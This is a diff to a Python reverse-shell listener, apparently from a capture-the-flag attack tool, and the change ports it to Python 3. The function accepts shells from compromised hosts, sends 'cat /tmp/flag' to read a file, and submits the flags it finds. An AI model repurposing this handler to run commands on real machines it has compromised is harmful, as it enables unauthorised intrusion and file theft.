@@ -48,16 +48,16 @@ def createSocket():
         log.info("connection established with:")
         log.info(addr)
         conn.settimeout(5)
-        flagbuff = conn.recv(1024)
+        flagbuff = conn.recv(1024).decode()
         log.debug(flagbuff)
-        conn.send('cat /tmp/flag')
-        conn.send('\n')
+        conn.send('cat /tmp/flag'.encode())
+        conn.send('\n'.encode())
         time.sleep(1)
-        flags = conn.recv(1024)
+        flags = conn.recv(1024).decode()
         for flag in re.findall(MATCH_FLAG, flags):
+            log.info("received flag: "+flag)
             question_solver.check_submit(flag, '反弹shell')
-            log.info("received flag"+flag)
-        conn.send('exit\n')
+        conn.send('exit\n'.encode())
     log.info('已停止反弹shell监听')
 
 
